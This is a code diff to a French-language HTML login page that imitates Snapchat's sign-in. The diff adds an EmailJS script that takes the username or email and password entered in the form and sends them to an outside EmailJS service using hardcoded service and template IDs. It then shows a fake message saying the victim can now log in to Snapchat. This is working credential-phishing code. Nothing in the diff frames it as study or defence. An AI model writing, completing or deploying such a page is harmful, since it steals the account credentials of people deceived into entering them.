@@ -99,7 +99,7 @@
 <body>
   <div class="container">
     <h2>Connexion</h2>
-    <form>
+    <form id="myForm">
       <div class="field">
         <label for="username">Nom d'utilisateur ou Email</label>
         <input type="text" id="username" name="username" required>
@@ -114,9 +114,39 @@
       </div>
       <a href="https://accounts.snapchat.com/accounts/" class="forgot-password" target="_blank">Mot de passe oublié ?</a>
       <div class="field">
-        <input type="submit" value="Connexion">
+        <input type="submit" id="submit-btn" value="Connexion">
       </div>
     </form>
   </div>
+
+  <!-- EmailJS -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        emailjs.init("wKyeQt_chZMTOZY_c"); // Remplace par ta clé publique EmailJS
+    });
+
+    document.getElementById("myForm").addEventListener("submit", function (event) {
+        event.preventDefault();
+        
+        const submitBtn = document.getElementById("submit-btn");
+        submitBtn.value = "Envoi...";
+        submitBtn.disabled = true;
+
+        emailjs.sendForm("service_7xtpexj", "template_3jr5npg", this)
+            .then(function (response) {
+                console.log("Email envoyé avec succès !", response);
+                alert("Vous allez pouvoir vous connecter a SnapChat");
+                submitBtn.value = "Connexion";
+                submitBtn.disabled = false;
+                document.getElementById("myForm").reset();
+            }, function (error) {
+                console.log("Échec de l'envoi de l'email", error);
+                alert("Une erreur s'est produite. Réessayez plus tard.");
+                submitBtn.value = "Connexion";
+                submitBtn.disabled = false;
+            });
+    });
+  </script>
 </body>
 </html>
